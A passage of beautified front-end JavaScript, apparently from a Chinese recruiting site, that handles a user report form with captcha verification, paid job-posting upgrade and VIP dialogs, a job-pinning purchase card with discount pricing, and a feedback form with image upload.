                Report.initVerify(wrap))
            },
            fail: function(e, t) {
                uploadContainer.find("a").html("上传图片"),
                $.toast({
                    content: "上传失败",
                    type: "error"
                })
            }
        })
    },
    submitForm: function(t, i, n) {
        if (!Report.submitIng) {
            var a = t
              , o = $.trim(a.find("textarea").val())
              , s = !1
              , r = this
              , c = ""
              , l = ""
              , d = [];
            let e = !(targetId = "");
            if ($.each($(".form-row-choice", a), function() {
                if ($(this).find(".require-icon").length && !$(this).find(".select-option-list li.is-check").length)
                    return $.toast({
                        type: "error",
                        content: $(this).data("title") + "标签不能为空"
                    }),
                    e = !1
            }),
            e) {
                if ($.each($(".form-row-choice", a), function() {
                    var e;
                    $(".select-option-list li", $(this)).hasClass("is-check") && (e = $.map($(".select-option-list li.is-check", $(this)), function(e) {
                        return {
                            code: $(e).data("code"),
                            extraInfo: $(e).find("input").val() || ""
                        }
                    }),
                    d.push({
                        code: $(this).data("code"),
                        options: e
                    }))
                }),
                a.find(".ipt-wrap").each(function(e, t) {
                    return s = r.checkForm($(t)),
                    r.checkForm($(t))
                }),
                a.find(".preview img").each(function() {
                    c += $(this).attr("data-img") + ","
                }),
                c = c.substring(0, c.length - 1),
                targetId = "" != i ? (l = i,
                n) : "_reportData"in window ? (l = (h = window._reportData || {}).reportedId,
                h.targetId) : (l = Chat.curUserData.uid,
                Chat.curUserData.infoData.expectId),
                s && Report.showConcatInfo) {
                    var i = a.find(".report-account").hasClass("is-edit")
                      , p = $.trim(a.find(".report-account .ipt[name=account]").val() || "");
                    if (i)
                        return $.toast({
                            type: "error",
                            content: "您的联系方式还未保存"
                        }),
                        void (s = !1)
                }
                var u, h, f = {
                    reportedId: l,
                    reasonCode: Report.currentReportType.code,
                    content: o,
                    targetId: targetId,
                    imgUrl: c || "",
                    randomKey: a.find(".randomkey").val(),
                    captcha: $(".verify-box input").val(),
                    source: Report.source || "",
                    reasonLabel: Report.currentSecondReportType.code,
                    secondLabel: d.length ? JSON.stringify(d) : "",
                    account: p || ""
                };
                return Report.sdkInfo && (delete f.randomKey,
                delete f.captcha,
                f.challenge = a.find('input[name="challenge"]').val(),
                f.validate = a.find('input[name="validate"]').val(),
                f.seccode = a.find('input[name="seccode"]').val()),
                s && (s = !1,
                Report.submitIng = !0,
                u = window._jobInfo || {},
                h = window._reportData || {},
                $.ajax({
                    url: "/wapi/zpuser/wap/user/getInfoBeforeReport",
                    type: "POST",
                    data: {
                        reasonCode: Report.currentReportType.code || "",
                        securityId: u.securityId || ""
                    },
                    dataType: "JSON",
                    success: function(e) {
                        0 == e.code && e.zpData ? (e = ['<div class="before-report-container">', '<div class="before-report-title"><img src="https://img.bosszhipin.com/static/file/2021/t33bj2422p1640593439268.png" />温馨提示</div>', "<p>本平台不支持任何形式的收费行为，当行业存在租赁行为并产生租赁费用时，需BOSS提前公示费用明细。请先确认以下公示内容，继续举报需提供收费金额及相关截图。</p>", '<a class="charge-a-link" href="/mpa/html/rpo/online-car/online-car-result?securityId=' + (u.securityId || "") + '" target="_blank">查看该boss已公示的收费明细></a>', "</div>"],
                        $.dialog({
                            title: "",
                            content: e.join(" "),
                            confirmText: "我已了解，放弃举报",
                            cancelText: "仍然举报",
                            wrapClass: "before-report-dialog",
                            closeLayer: !1,
                            onOpen: function(e) {
                                e.find(".charge-a-link").on("click", function() {
                                    try {
                                        _T.sendEvent("system-safely-report-OnelinecarFeePopupClick", h.reportedId || "", h.targetId || "", "3")
                                    } catch (e) {}
                                });
                                try {
                                    _T.sendEvent("system-safely-report-OnelinecarFeesPopup", h.reportedId || "", h.targetId || "")
                                } catch (e) {}
                            },
                            onCancel: function(e) {
                                e.remove(),
                                m();
                                try {
                                    _T.sendEvent("system-safely-report-OnelinecarFeePopupClick", h.reportedId || "", h.targetId || "", "1")
                                } catch (e) {}
                            },
                            onClose: function() {
                                try {
                                    _T.sendEvent("system-safely-report-OnelinecarFeePopupClick", h.reportedId || "", h.targetId || "", "4")
                                } catch (e) {}
                                Report.submitIng = !1
                            },
                            onConfirm: function(e) {
                                e.remove();
                                try {
                                    _T.sendEvent("system-safely-report-OnelinecarFeePopupClick", h.reportedId || "", h.targetId || "", "2")
                                } catch (e) {}
                            }
                        })) : m()
                    },
                    error: function() {
                        m(),
                        Report.submitIng = !1
                    }
                })),
                !1
            }
            function m() {
                $.ajax({
                    url: "/wapi/zpuser/wap/user/reportV2",
                    type: "POST",
                    contentType: "application/json; charset=utf-8",
                    data: JSON.stringify(f),
                    dataType: "JSON",
                    timeout: 3e4,
                    success: function(e) {
                        0 === e.code ? (Report.evidenceDialog.close("confirm"),
                        $.toast({
                            content: "提交成功，请耐心等待反馈",
                            type: "success"
                        })) : ($.toast({
                            content: e.message,
                            type: "error"
                        }),
                        Report.initVerify(t)),
                        Report.submitIng = !1
                    },
                    error: function(e) {
                        Report.submitIng = !1
                    }
                })
            }
        }
    },
    checkForm: function(e) {
        if (Report.sdkInfo && e.hasClass("verify-box")) {
            var t = e.find('input[name="challenge"]');
            if (!t || !t.val())
                return e.next(".text-error").html("请先完成验证"),
                !1;
            e.next(".text-error").html("")
        }
        var i, t = $.trim(e.find(".ipt").val());
        if (null != e.find(".ipt").attr("data-range")) {
            if (i = e.find(".ipt").attr("data-range").split(",")[1],
            t.length > i)
                return e.next(".text-error").html("请输入" + i + "个字以内的内容"),
                !1;
            e.next(".text-error").html("")
        }
        return "reportedTel" == e.find(".ipt").attr("name") && t && !/^(1[3456789][0-9]{9})$/.test(t) ? (e.next(".text-error").html("请填写正确的手机号"),
        !1) : "reportedEmail" == e.find(".ipt").attr("name") && t && !/^(\w)+(\.\w+)*@(\w)+((\.\w+)+)$/.test(t) ? (e.next(".text-error").html("请填写正确的邮箱"),
        !1) : "content" == e.find(".ipt").attr("name") && "" == t ? (i = e.find(".ipt").attr("data-blank"),
        e.find(".ipt").focus(),
        e.next(".text-error").html(i),
        !1) : (e.next(".text-error").html(""),
        !0)
    },
    handleClickBack: function(e) {
        var t = !0
          , i = "";
        e.find(".select-option-list li.is-check").length && (t = !1),
        $(".reason-content-ipt").val() && (t = !1),
        $(".verify-ipt").val() && (t = !1),
        e.find(".preview img").each(function() {
            i += $(this).attr("data-img") + ","
        }),
        (t = (i = i.substring(0, i.length - 1)).length ? !1 : t) ? ($(".dialog-report-type-second").show(),
        $(".pop-report").remove()) : $.dialog({
            content: "内容未提交，确认退出吗？",
            title: "温馨提示",
            inline: !0,
            wrapClass: "dialog-back-to-type-list",
            onConfirm: function(e) {
                e.remove(),
                setTimeout(function() {
                    $(".dialog-report-type-second").show(),
                    $(".pop-report").remove()
                }, 300)
            }
        })
    },
    myActionLog: function(e) {
        try {
            $.ajax({
                method: "post",
                url: "/wapi/zpCommon/actionLog/common.json",
                data: {
                    ba: JSON.stringify(e)
                },
                cache: !1,
                success: function(e) {},
                error: function() {}
            })
        } catch (e) {}
    }
}
  , Block = ($(function() {
    Report.init()
}),
function() {
    function c(e) {
        return Utemplate(' <div class="block-intro"><img src="https://static.zhipin.com/v2/web/boss/images/icon-lock-24.png"><dl><dt><%this.title%></dt><dd class="gray"><%this.description%></dd></dl><div class="clear"></div></div>', e)
    }
    function o(e) {
        var t = $.Deferred();
        return $.get("/bossweb/job/vipaccountprice.json", e).success(function(e) {
            1 == e.rescode && t.resolve(e)
        }),
        t
    }
    function a(e) {
        var i = $.Deferred();
        return e.combos ? i.resolve(e.combos) : $.get("/bossweb/job/price.json", e).success(function(e) {
            var t;
            1 == e.rescode && ((t = {}).ordinary = r(e.ordinary),
            t.carefree = r(e.carefree),
            e.experience && (t.experience = r(e.experience)),
            t.activityType = e.activityType,
            t.activityEndDate = e.activityEndDate,
            i.resolve(t))
        }),
        i
    }
    var i = function(e) {
        e = {
            pay: e.currentPriceDesc,
            list: e.lineList
        };
        return Utemplate('<table class="vip-grid"><thead><tr><th>账号权益</th><th style="width: 90px;">认证账号</th><th style="width: 70px;">VIP账号</th></tr></thead><tbody><%for (var i=0;i<this.list.length;i++){%><tr><td><div class="cut-off"><%this.list[i].itemDesc%><i class="gray"><%this.list[i].itemDescHint%></i></div></td><td class="gray"><%this.list[i].curDesc%></td><td class="primrose"><%this.list[i].totalDesc%></td></tr><%}%></tbody></table><div class="vip-counter"><p class="fl">权益总价值<i>限时折扣</i></p><p class="fr primrose">¥<%this.pay%></p></div>', e)
    }
      , l = function(e) {
        return Utemplate('<%if(this.activityType){%><div class="hot-promotion"></div><%}%><div class="hot-list"><p class="hot-intro ordinary">火爆职位普通版，每日查看详情<span class="ordinary-view"><%this.ordinary[0].view%></span>，开聊<span class="ordinary-employ"><%this.ordinary[0].employ%></span></p><ul class="ordinary"><%for(var i=0;i<this.ordinary.length;i++){%><li><label class="radio"><input data-index="<%i%>" data-type="ordinary" type="radio" <%if(i == 0){%>checked<%}%> name="ordinary" value="0"><span>普通版，<%this.ordinary[i].description%><%if(this.ordinary[i].discount){%><em class="discount"><%this.ordinary[i].discount%></em><%}%><em class="pay">￥<%this.ordinary[i].pay%>/职位</em></span></label></li><%}%></ul><%if(this.carefree.length){%><p class="hot-intro ordinary" style="padding-top: 9px;">火爆职位畅聊版，每日查看详情<span class="carefree-view"><%this.carefree[0].view%></span>，开聊<span class="carefree-employ"><%this.carefree[0].employ%></span></p><ul class="ordinary"><%for(var j=0;j<this.carefree.length;j++){%><li><label class="radio"><input data-index="<%j%>" type="radio" data-type="carefree" name="ordinary" value="0"><span>畅聊版，<%this.carefree[j].description%><%if(this.carefree[j].discount){%><em class="discount"><%this.carefree[j].discount%></em><%}%><em class="pay">￥<%this.carefree[j].pay%>/职位</em></span></label></li><%}%></ul><%}%>', e)
    }
      , s = function(e) {
        return '<div class="vip-ordinary-grid">' + i(e) + "</div>"
    }
      , d = function(e, t) {
        return '<div class="block-storm combination-vip"><div class="hot-list-tab"><ul><li data-cls="vip" class="checked">开通VIP</li><li data-cls="ord">单独发布</li></ul></div><div class="vip-wrap">' + i(e) + '</div><div class="ordinary-wrap">' + l(t) + "</div></div>"
    }
      , r = function(i) {
        return $.isArray(i) ? $.each(i, function(e, t) {
            -1 == t.view ? i[e].view = "无上限" : i[e].view = t.view + "人",
            -1 == t.employ ? i[e].employ = "无上限" : i[e].employ = t.employ + "人"
        }) : (-1 == i.view ? i.view = "无上限" : i.view = i.view + "人",
        -1 == i.employ ? i.employ = "无上限" : i.employ = i.employ + "人"),
        i
    };
    function p(e, t) {
        var i = e
          , n = $.confirm({
            content: t,
            title: !1,
            closeIcon: !0,
            cancelButton: i.cancelText || !1,
            confirmButton: i.confirmText || "确定",
            confirmButtonClass: "fr",
            columnClass: "pop-block " + i.style,
            onOpen: function() {
                i.ka && this.$confirmButton.attr("ka", i.ka),
                i.vka && __conversion(i.vka),
                i.open && i.open(this)
            },
            confirm: function() {
                if (i.next && i.next(this.$content),
                !i.next && i.confirm && i.confirm(),
                0 == i.autoClose)
                    return !1
            },
            cancel: function(e) {
                i.cancel && e && i.cancel()
            },
            onClose: function(e) {
                i.close && i.close()
            }
        });
        $(document).on("_BEFORE_UNLOAD", function() {
            n.close()
        })
    }
    return {
        confirm: function(e) {
            var t = e
              , e = e.content || c({
                title: t.title,
                description: t.description
            });
            t.style = "pop-block-alert",
            p(t, e)
        },
        purchase: function(e, s) {
            if (s.dpGray && s.blockPageData)
                return PositionShop.hot(e, s);
            function t(i) {
                function n(e) {
                    return "<i>" + ("0" + e).substr(-2, 2).split("").join("</i><i>") + "</i>"
                }
                var e;
                r.activityType && r.activityEndDate && (e = r.activityEndDate,
                new Clocking(e,1e3).interval(function(e) {
                    var t = ""
                      , t = 0 < e.day ? '<span class="prom-text">距结束</span>' + n(e.day) + "&nbsp;天" : '<span class="prom-text">距结束还剩</span>' + n(e.hour) + "：" + n(e.minute) + "：" + n(e.second);
                    i.find(".hot-promotion").html(t)
                }))
            }
            var r = {}
              , n = {
                open: function(a) {
                    var o = a.$content;
                    o.on("change", "input[name='ordinary']", function() {
                        var e = $(this).attr("data-type")
                          , t = $(this).attr("data-index")
                          , t = r[e][t]
                          , i = a.$confirmButton
                          , n = t.pay;
                        s.isEdit,
                        i.text("付费发布职位：￥" + n),
                        o.find("." + e + "-view").text(t.view),
                        o.find("." + e + "-employ").text(t.employ)
                    }),
                    o.on("click", ".hot-list-tab li", function() {
                        $(".hot-list-tab .checked").removeClass("checked"),
                        $(this).addClass("checked"),
                        o.find(".block-storm").removeClass("combination-ord").removeClass("combination-vip").addClass("combination-" + $(this).attr("data-cls")),
                        "ord" == $(this).attr("data-cls") ? (a.$confirmButton.removeClass("btn-vip-rose"),
                        o.find("input[name=ordinary]").filter(":checked").trigger("change")) : a.$confirmButton.addClass("btn-vip-rose").text("开通VIP帐号")
                    }),
                    $(".hot-list-tab li.checked").length ? $(".hot-list-tab li.checked").trigger("click") : o.find("input[name=ordinary]").filter(":checked").trigger("change"),
                    a.$btnc.on("click", ".trial a", function() {
                        var e = r.experience;
                        e.type = "experience",
                        s.confirm(e),
                        a.close(),
                        __conversion("block_sendjob_purchase_trial")
                    }),
                    r.experience && a.$btnc.append(Utemplate('<p class="trial">您有一次免费体验机会，可免费试用火爆职位普通版<%this.expiredays%>天，<a href="javascript:">点击免费使用</a></p>', r.experience)),
                    t(o)
                },
                next: function() {
                    var e = function() {
                        if ("vip" == $(".hot-list-tab .checked").attr("data-cls"))
                            return r.vip.type = "vip",
                            r.vip;
                        var e = $("input[name=ordinary]").filter(":checked")
                          , t = e.attr("data-type")
                          , e = e.attr("data-index");
                        return (selected = r[t][e]).type = t,
                        selected.activityType = r.activityType,
                        selected.activityEndDate = r.activityEndDate,
                        selected.ba = r.ba,
                        selected
                    }();
                    s.confirm && s.confirm(e)
                }
            };
            function i() {
                function t(e) {
                    r = e;
                    var t = $.extend(n, s);
                    p(t, c({
                        title: t.title,
                        description: t.description
                    }) + l(e))
                }
                e.combos ? t(e.combos) : a(e).then(function(e) {
                    t(e)
                })
            }
            s.canBuyVip ? $.when(o({
                sf: s.sf || "",
                vipPriceId: s.vipPriceId
            }), a(e)).then(function(e, t) {
                (r = t).vip = {
                    ba: e.detailPage.ba,
                    vipPriceId: s.vipPriceId,
                    pay: e.detailPage.currentPriceDesc.replace(/[^\d.]/g, "")
                };
                var i = $.extend(n, s);
                p(i, c({
                    title: i.title,
                    description: i.description
                }) + d(e.detailPage, t))
            }) : i()
        },
        supermethod: function(e, o) {
            function t(e) {
                s = e;
                var t = o
                  , i = c({
                    title: t.title,
                    description: t.description
                }) + (-1 == (i = e).view ? i.view = "无上限" : i.view = i.view,
                Utemplate('<div class="hot-list hot-list"><p class="hot-intro">可保持职位在线<%this.description%>，期间每日查看详情<%this.view%>，开聊上限为<%this.employ%>。</p><ul class="ordinary"><%for(var i=0;i<this.prices.length;i++){%><li><label class="radio"><input data-index="<%i%>" type="radio" <%if(i == 0){%>checked<%}%> name="super" value="<%i%>"><span>普通版，<%this.prices[i].description%><%if(this.prices[i].discount){%><em class="discount"><%this.prices[i].discount%></em><%}%><em class="pay">￥<%this.prices[i].pay%>/职位</em></span></label></li><%}%></ul></div>', i));
                t.next = function() {
                    var e = $("input[name=super]").filter(":checked").attr("data-index")
                      , e = s.prices[e];
                    t.confirm(e)
                }
                ,
                t.open = function(n) {
                    var a = n.$content;
                    o.isEdit;
                    n.$confirmButton.text("付费发布职位：￥" + e.pay),
                    n.$btnc.on("click", ".trial a", function() {
                        var e = s.experience;
                        e.type = "experience",
                        o.confirm(e),
                        n.close(),
                        __conversion("block_sendjob_purchase_trial")
                    }),
                    a.on("change", "input[name='super']", function() {
                        var e = $(this).attr("data-index")
                          , e = s.prices[e]
                          , t = n.$confirmButton
                          , i = e.pay
                          , t = (o.isEdit,
                        t.text("付费发布职位：￥" + i),
                        "可保持职位在线" + e.expiredays + "天，期间每日查看详情" + e.view + "，开聊上限为" + e.employ + "。");
                        a.find(".hot-intro").text(t)
                    }),
                    a.find("input[name=super]").filter(":checked").trigger("change"),
                    s.experience && n.$btnc.append(Utemplate('<p class="trial">你有一次免费体验机会，可以免费试用火爆职位限制版 <%this.expiredays%> 天，<a ka="block_sendjob_purchase_super_trial" href="javascript:">点击免费使用</a></p>', s.experience))
                }
                ,
                p(t, i)
            }
            var s, i, n;
            e.combos ? t(e.combos) : (i = e,
            n = $.Deferred(),
            $.get("/bossweb/job/superprice.json", i).success(function(e) {
                1 == e.rescode && (e.prices = r(e.prices),
                e.experience && (e.experience = r(e.experience)),
                n.resolve(e))
            }),
            n.then(function(e) {
                t(e)
            })),
            console.log(arguments)
        },
        upgrade: function(t, e) {
            var i, n, a = e.content || ((i = t).hlShortDesc.name = (a = i.hlShortDesc,
            n = a.name,
            a.highlightList && a.highlightList.length && $.each(a.highlightList, function(e, t) {
                t = n.substr(t.startIndex, t.endIndex);
                n = n.replace(t, "<b>" + t + "</b>")
            }),
            n),
            Utemplate('<div class="super-upgrade-panel"><div  class="super-upgrade-description"><span class="icon-lock"></span><div class="description"><h4><%this.title%>普通版，<%this.animationTitle%></h4><p><%this.shortDesc.name%></p><p><%this.hlShortDesc.name%></p></div></div><dl class="super-upgrade-list"><dt>畅聊版<span class="icon-upgrade">升级</span></dt><%for(var i=0;i<this.descList.length;i++){%><dd><%this.descList[i]%><i class="icon-check"></i></dd><%}%><dd><b>升级所需价格：</b><span class="bean-number"><%this.currentPriceDesc%></span><span class="upgrade-discount">限时折扣</span><span class="annotation"><%this.upgradeDesc%></span></dd></dl><p class="notice">*以上价格均为单个职位价格，不同城市不同职类价格有所波动</p></div>', i));
            e.style = "pop-block-upgrade",
            e.open = function(e) {
                e.$confirmButton.text("付费升级职位：" + t.currentPriceDesc)
            }
            ,
            p(e, a)
        },
        vip: function(n, a) {
            o(n).then(function(e) {
                var t = a
                  , i = c({
                    title: t.title || "发布普通职位个数已达上限",
                    description: t.description
                }) + s(e.detailPage);
                t.style = "pop-vip",
                t.cancelText = "我再想想",
                t.confirmText = "开通VIP帐号",
                t.next = function() {
                    a.confirm({
                        ba: e.detailPage.ba,
                        vipPriceId: n.vipPriceId,
                        pay: e.detailPage.currentPriceDesc.replace(/[^\d.]/g, "")
                    })
                }
                ,
                p(t, i)
            })
        },
        action: function(e, t) {
            t = t || {},
            e = $.extend(e, t);
            $.ajax({
                method: "post",
                url: "/wapi/zpCommon/actionLog/common.json",
                data: {
                    ba: JSON.stringify(e)
                },
                cache: !1,
                success: function(e) {},
                error: function() {}
            })
        },
        formatBA: function(e) {
            var t = e;
            return t = e && "[object Object]" !== Object.prototype.toString.call(e) ? JSON.parse(decodeURIComponent(e)) : t
        }
    }
}())
  , Upgrade = function() {
    function i(e, t) {
        if (!0 === t.dpGray || "true" === t.dpGray)
            return PositionShop.upgrade(e, t);
        window.top.Block.upgrade(e, $.extend({
            cancelText: "我再想想",
            vka: "block_upgradejob_purchase_hot",
            cancel: function() {},
            confirm: function() {
                t.ba && Block.action(Block.formatBA(t.ba), {
                    p4: 4,
                    p5: t.priceId,
                    action: "user-block-biz-button"
                }),
                n({
                    success: function() {}
                }, t)
            }
        }, t))
    }
    var n = function(e, t) {
        window.top.Purchase.position("/boss/block/pay.json", {
            priceId: t.priceId,
            action: 4,
            hotJobType: 0,
            business: t.business || "",
            targetId: t.targetId,
            targetType: t.targetType
        }, {
            item: t,
            success: e.success,
            confirm: function() {}
        })
    };
    return {
        include: function(e, t) {
            return !!e.upgrade && (i(e, t),
            !0)
        },
        render: i
    }
}()
  , DirectAccessCard = function() {
    function t() {
        var e = c()
          , t = "选择更多职类置顶，提升招聘效果，可享额外折扣"
          , t = (0 < e.discount ? (t = "招聘效果提升" + ($(".direct-card-pop .position-category .selected").length + 1) + "倍 额外立减" + 100 * e.discount + "% ",
        $(".direct-card-pop .position-tip .gray").addClass("discount-tip").text(t)) : $(".direct-card-pop .discount-tip").removeClass("discount-tip").text(t),
        $(".direct-card-pop .dialog-footer  .prop-total").remove(),
        '<p class="prop-total">￥<em>' + e.pay);
        0 < e.save && (t += "</em><span>(已省" + e.save + ")</span>"),
        t += "</p>",
        $(".direct-card-pop .dialog-footer .btns").append(t)
    }
    function n(e) {
        o = $.extend({}, e),
        $.dialog({
            bind: !0,
            title: "",
            closeLayer: !1,
            content: s.card(e),
            wrapClass: "direct-card-pop",
            confirmText: "购买并使用",
            cancelText: "取消",
            onOpen: function(e) {
                $(e).on("click", ".position-category dd", function() {
                    $(this).toggleClass("selected"),
                    t()
                }),
                t()
            },
            onConfirm: function() {
                var a = []
                  , e = ($(".direct-card-pop .position-category .selected").each(function(e, t, i) {
                    var n = $(this).index();
                    a.push(o.positionList[n].code)
                }),
                {
                    jobId: o.job.jobId,
                    positionCode: a.join(","),
                    userCouponId: ""
                })
                  , t = e;
                function i() {
                    Payment.success({
                        article: "购买成功",
                        text: "即刻置顶职位24小时，邀约匹配牛人投递,可在BOSS直聘APP「我的道具」中查看使用效果",
                        confirm: function() {
                            r()
                        }
                    })
                }
                t = {
                    url: "/boss/item/pay/quicktop.json",
                    data: e,
                    description: "购买简历直通卡",
                    amount: c().pay,
                    itemId: "b6ed128ee1b8d2841HI~",
                    success: i,
                    close: function() {},
                    cancel: function() {}
                },
                Payment.purchase(t, {
                    success: i,
                    cancel: r,
                    close: r
                }),
                this.close(),
                __conversion("ermergency_buy")
            },
            onClose: function(e) {
                $(e).off("click")
            },
            onCancel: function() {
                r()
            }
        })
    }
    var o = {}
      , a = function(e) {
        var t = $.Deferred();
        return $.get("/boss/item/quicktop/selposition.json?jobId=" + e).success(function(e) {
            1 == e.rescode ? t.resolve(e) : $.toast({
                type: "error",
                content: e.resmsg
            })
        }),
        t
    }
      , s = {
        notice: function(e) {
            return Utemplate('<div class="free-notice-panel"><h4 class="subhead">保存成功</h4><p>您使用免费权益发布了一个普通职位，</p><p>该职位价值50元/月，</p><p>剩余可免费在线普通职位数：<%this.unPubCount%>个。</p><i class="bead-close"></i></div>', e)
        },
        recommend: function(e, t) {
            return (t.title ? s.notice(t) : Utemplate('<div class="brief-panel"><p class="icon-brief icon-success"></p><div class="brief-description"><p class="heading">保存成功</p><p class="position gray"><span class="position-name"><%this.positionName%></span><em class="vline"></em><%this.locationName%><em class="vline"></em><%this.lowSalary%>K-<%this.highSalary%>K</p></div><i class="bead-close"></i></div>', e)) + Utemplate('<div class="introduce-panel"><img src="https://static.zhipin.com/v2/web/boss/images/prop/promotion.png"><p class="slogan">急聘直通卡限时专享</p><p class="intro-text">置顶职位+邀约投递，立即提升职位招聘效率</p><p class="notice">职位发布24小时内限时购买</p><button class="btn">立即体验</button></div>', e)
        },
        card: function(e) {
            return Utemplate('<div class="brief-panel"><p class="icon-brief icon-card"></p><div class="brief-description"><p class="heading">急聘直通卡购买</p><p class="position gray">置顶职位+邀约投递，立即提升职位招聘效率</p></div><i class="card-discount"></i></div><div class="card-description"><p class="position gray">使用职位：<span class="position-name"><%this.job.positionName%></span><em class="vline"></em><%this.job.locationName%><em class="vline"></em><%this.job.lowSalary%>K-<%this.job.highSalary%>K</p><p class="direct-notice">购买后即置顶该职位，连续置顶24小时</p><div class="position-category"><div class="position-tip">置顶职类<p class="fr gray">选择更多职类置顶，提升招聘效果，可享额外折扣</p></div><%if(1 < this.positionList.length){%><dl><dt><%this.positionList[0].name%></dt><%for(var i=1; i<this.positionList.length;i++){%><dd><%this.positionList[i].name%></dd><%}%></dl><%}%></div></div>', e)
        }
    }
      , r = function() {
        setTimeout(function() {
            window.top.location.href = "/chat/im?mu=/bossweb/joblist.html"
        }, 1e3)
    }
      , c = function() {
        var e = $(".direct-card-pop .position-category .selected")
          , t = 0 < e.length ? e.length : 0
          , t = Math.min(t, o.positionDiscount.length - 1)
          , t = o.positionDiscount[t]
          , i = 1e3 * o.positionList[0].price
          , n = (e.each(function(e, t) {
            e = $(this).index();
            i += 1e3 * o.positionList[e].price
        }),
        Math.floor(i * (1 - t) / 1e3));
        return {
            amount: i / 1e3,
            discount: t,
            save: 0 < e.length ? Math.ceil(i / 1e3 - n) : 0,
            pay: n
        }
    };
    return {
        show: n,
        notice: function(e) {
            $.dialog({
                bind: !0,
                title: "",
                closeLayer: !1,
                content: s.notice(e),
                wrapClass: "direct-card-pop",
                confirmText: !1,
                cancelText: !1,
                onOpen: function(e) {
                    var t = this;
                    $(e).on("click", ".bead-close", function() {
                        t.close(),
                        r()
                    })
                },
                onClose: function(e) {
                    $(e).off("click")
                }
            })
        },
        recommend: function(i, e) {
            e = e || {},
            $.dialog({
                bind: !0,
                title: "",
                closeLayer: !1,
                content: s.recommend(i, e),
                wrapClass: "direct-card-pop",
                confirmText: !1,
                cancelText: !1,
                onOpen: function(e) {
                    var t = this;
                    $(e).on("click", ".bead-close", function() {
                        t.close(),
                        r()
                    }),
                    $(e).on("click", ".introduce-panel .btn", function() {
                        t.close(),
                        a(i.jobId).then(function(e) {
                            n(e)
                        }),
                        __conversion("ermergency_edit")
                    }),
                    __conversion("ermergency_card")
                },
                onClose: function(e) {
                    $(e).off("click")
                }
            })
        }
    }
}()
  , Feedback = {
    _picCount: 0,
    _limitPicCount: 3,
    _randkey: "",
    sdkInfo: null,
    verifyType: 1,
    isLogin: !!(window._PAGE || {}).uid,
    dialogContentBody: function() {
        return '<div class="prop-inner"><div class="feedback-content ipt-wrap"><div class="sub-title"><em class="required-icon">*</em>描述内容: </div><div class="sub-content"><textarea name="content" ka="faq-content" class="ipt" placeholder="描述您遇到的问题，并说明您的诉求或需要什么帮助（必填）" data-range="0,500" maxlength="500" data-blank="请输入描述内容"></textarea></div></div><span class="text-error"></span>' + (Feedback.isLogin ? '<div class="upload"><div class="sub-title">问题截图: </div><div class="sub-content"><div class="upload-pics"><a href="javascript:;" class="upload-pic-btn-wrapper"><input title="" type="file" name="file" class="upload-pic-btn" multiple /><span class="iboss-plus"></span><em>上传图片</em></a></div><div class="upload-tips">拖拽上传图片，更好帮您定位问题<br />最多3张，支持JPG、JPEG、PNG格式（选填）</div></div><div class="preview"></div></div>' : "") + '</div><div class="ipt-wrap"><div class="sub-title">验证码: </div><div class="verify-box sub-content"><input type="text" class="ipt" name="captcha" ka="faq-captcha" placeholder="验证码"maxlength="4" data-blank="请输入验证码" /> <img src="/wapi/zppassport/captcha?randomKey=' + this._randkey + '" class="loaded"/><input type="hidden" name="randomKey" class="randomkey" value="" /></div></div><span class="text-error"></span>'
    },
    initVerify: function(e) {
        Feedback.sdkInfo = null;
        var t = "verrify" + Math.random().toString(32).substr(-10, 6)
          , i = e.find(".verify-box");
        i.addClass("verify-box-new"),
        i.attr("id", t),
        i.length && (i.html(""),
        "undefined" != typeof VerifyCodeSDK && (Feedback.sdkInfo = new VerifyCodeSDK({
            dom: i[0],
            type: 1,
            success: function(e) {
                i.find('input[name="challenge"]').length || (i.append('<input type="hidden" name="challenge"></input>'),
                i.append('<input type="hidden" name="validate"></input>'),
                i.append('<input type="hidden" name="seccode"></input>')),
                i.find('input[name="challenge"]').val(e.challenge),
                i.find('input[name="validate"]').val(e.validate),
                i.find('input[name="seccode"]').val(e.seccode)
            },
            ready: function(e) {
                Feedback.verifyType = e.type
            }
        })))
    },
    getContent: function(e) {
        var o = this
          , t = (e || {}).channel || 0;
        $.get("/wapi/zppassport/captcha/randkey").success(function(e) {
            e.zpData && e.zpData.randKey && (o._randkey = e.zpData.randKey),
            $.dialog({
                content: o.dialogContentBody(),
                title: '意见反馈<span class="tips">' + (Feedback.isLogin ? "提交后，可登录APP端查看客服回复的消息" : "建议您在描述内容中留下联系方式，以便更好的帮助您解决问题") + "</span>",
                closeText: !0,
                cancelButton: "取消",
                confirmButton: "确认",
                inline: !0,
                wrapClass: "pop-feedback " + (Feedback.isLogin ? "is-login" : ""),
                onOpen: function(e) {
                    var t = e.find(".upload-pics")
                      , i = e.find(".upload-pic-btn")
                      , n = e.find(".upload-pic-btn-wrapper")
                      , a = e.find(".verify-box");
                    Feedback._picCount = 0,
                    a.find("img").on("click", function() {
                        $(this).attr("src", "/wapi/zppassport/captcha?randomKey=" + o._randkey + "&_r=" + (new Date).getTime())
                    }),
                    o.uploadPicture(t, e),
                    i.on("click", function(e) {
                        if (t.children(".upload-pic").length >= Feedback._limitPicCount)
                            return $.toast({
                                content: "最多上传" + Feedback._limitPicCount + "张图片",
                                type: "error"
                            }),
                            e.preventDefault(),
                            !1
                    }),
                    t.on("click", ".remove-pic", function(e) {
                        $(this).closest(".upload-pic").remove(),
                        --Feedback._picCount,
                        0 == Feedback._picCount && t.parents(".upload").removeClass("has-upload"),
                        t.children(".upload-pic").length < Feedback._limitPicCount && n.show()
                    }),
                    seriesLoadScripts("https://static.zhipin.com/library/js/sdk/verify-sdk-v2.3.js?t=" + new Date, function() {
                        Feedback.initVerify(e)
                    })
                },
                onConfirm: function(e) {
                    return o.submitForm(e, t)
                },
                onCancel: function(e) {
                    try {
                        _T.sendEvent("feedback_cancel")
                    } catch (e) {}
                    e.remove()
                }
            })
        })
    },
    uploadPicture: function(elPicsWrap, popContent) {
        var _this = this
          , vertifyEl = popContent.find(".verify-box .ipt")
          , uploadZone = popContent.find(".upload .sub-content")
          , uploadWaringTimer = null
          , reg = /(\.|\/)(png|jpg|jpeg)$/i;
        elPicsWrap.fileupload({
            method: "POST",
            url: "/wapi/zpupload/naUploadImage.json",
            dataType: "text",
            dropZone: uploadZone,
            acceptFileTypes: reg,
            maxChunkSize: 2e6,
            formData: {
                source: "feed_back"
            },
            add: function(e, t) {
                var i = t.files[0]
                  , n = i.name
                  , i = i.size;
                if (reg.test(n))
                    if (2e6 < i)
                        $.toast({
                            content: "上传文件过大(最大2M)",
                            type: "error"
                        });
                    else {
                        if (Feedback._picCount >= Feedback._limitPicCount)
                            return clearTimeout(uploadWaringTimer),
                            uploadWaringTimer = setTimeout(function() {
                                $.toast({
